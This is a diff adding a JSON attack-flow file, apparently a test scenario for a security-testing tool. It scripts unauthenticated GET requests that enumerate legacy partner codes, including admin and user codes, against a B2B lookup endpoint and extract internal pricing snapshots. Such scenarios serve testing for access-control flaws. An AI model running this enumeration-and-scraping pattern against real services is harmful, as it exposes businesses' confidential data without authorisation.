@@ -1,0 +1,133 @@
+{
+  "id": "flow_b2b_legacy_partner_lookup_internal_pricing_harvest",
+  "name": "Attack: Actor Scrapes B2B Internal Pricing (Legacy Lookup)",
+  "description": "An anonymous actor enumerates legacy partner codes to scrape internal pricing snapshots from the unauthenticated B2B lookup endpoint and identify valid references.",
+  "headers": {
+    "Accept": "application/json"
+  },
+  "staticVars": {
+    "baseUrl": "https://bla-bypass.ase-team.com",
+    "knownPartnerCode1": "shske345pll",
+    "knownPartnerCode2": "pccuf987szf",
+    "knownPartnerCode3": "cjdjd654dkd",
+    "knownPartnerCode4": "auzjd123ioo",
+    "knownPartnerCode5": "bobjo113son",
+    "knownPartnerCode6": "carol114ite",
+    "adminPartnerCode": "admin111min",
+    "alicePartnerCode": "alice112ith",
+    "validButUnknownCode": "zzzzz999zzz",
+    "invalidPatternCode": "shske000pll"
+  },
+  "steps": [
+    {
+      "id": "step_b2b_lookup_known_code_1",
+      "name": "B2B Lookup: Known Partner Code 1 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode1}}",
+      "extract": {
+        "pricing_snapshot_1": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_known_code_2",
+      "name": "B2B Lookup: Known Partner Code 2 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode2}}",
+      "extract": {
+        "pricing_snapshot_2": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_known_code_3",
+      "name": "B2B Lookup: Known Partner Code 3 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode3}}",
+      "extract": {
+        "pricing_snapshot_3": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_known_code_4",
+      "name": "B2B Lookup: Known Partner Code 4 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode4}}",
+      "extract": {
+        "pricing_snapshot_4": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_known_code_5",
+      "name": "B2B Lookup: Known Partner Code 5 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode5}}",
+      "extract": {
+        "pricing_snapshot_5": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_known_code_6",
+      "name": "B2B Lookup: Known Partner Code 6 (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{knownPartnerCode6}}",
+      "extract": {
+        "pricing_snapshot_6": "body.pricing_snapshot"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_admin_code",
+      "name": "B2B Lookup: Admin Partner Code (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{adminPartnerCode}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_alice_code",
+      "name": "B2B Lookup: AliceSmith Partner Code (Scrape Pricing)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{alicePartnerCode}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_valid_unknown_code",
+      "name": "B2B Lookup: Valid-Format Unknown Code",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{validButUnknownCode}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_b2b_lookup_invalid_pattern_code",
+      "name": "B2B Lookup: Invalid Pattern Code",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/b2b/partner-lookup?q={{invalidPatternCode}}",
+      "onFailure": "continue"
+    }
+  ],
+  "visualLayout": {
+    "step_b2b_lookup_known_code_1": { "x": 50, "y": 50 },
+    "step_b2b_lookup_known_code_2": { "x": 250, "y": 50 },
+    "step_b2b_lookup_known_code_3": { "x": 450, "y": 50 },
+    "step_b2b_lookup_known_code_4": { "x": 650, "y": 50 },
+    "step_b2b_lookup_known_code_5": { "x": 850, "y": 50 },
+    "step_b2b_lookup_known_code_6": { "x": 1050, "y": 50 },
+    "step_b2b_lookup_admin_code": { "x": 50, "y": 150 },
+    "step_b2b_lookup_alice_code": { "x": 250, "y": 150 },
+    "step_b2b_lookup_valid_unknown_code": { "x": 450, "y": 150 },
+    "step_b2b_lookup_invalid_pattern_code": { "x": 650, "y": 150 }
+  }
+}
